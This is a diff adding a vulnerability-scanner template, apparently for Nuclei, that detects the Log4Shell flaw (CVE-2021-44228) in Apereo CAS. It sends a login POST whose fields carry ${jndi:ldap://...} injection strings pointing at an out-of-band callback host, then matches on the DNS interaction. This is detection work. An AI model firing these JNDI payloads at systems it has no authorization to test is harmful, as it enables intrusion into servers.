@@ -1,0 +1,37 @@
+id: CVE-2021-44228
+info:
+  name: Apereo CAS log4j2 RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apereo CAS has a log4shell RCE vulnerability. Attackers can exploit this vulnerability to execute arbitrary code on the server, potentially gaining control over the web server.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://apereo.github.io/2021/12/11/log4j-vuln/
+  classification:
+    cve-id: CVE-2021-44228
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+
+variables:
+  dnslog: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /cas/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=${jndi:ldap://{{dnslog}}}&password=${jndi:ldap://{{dnslog}}}&execution=${jndi:ldap://{{dnslog}}}&_eventId=submit&geolocation=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "${jndi:ldap://"
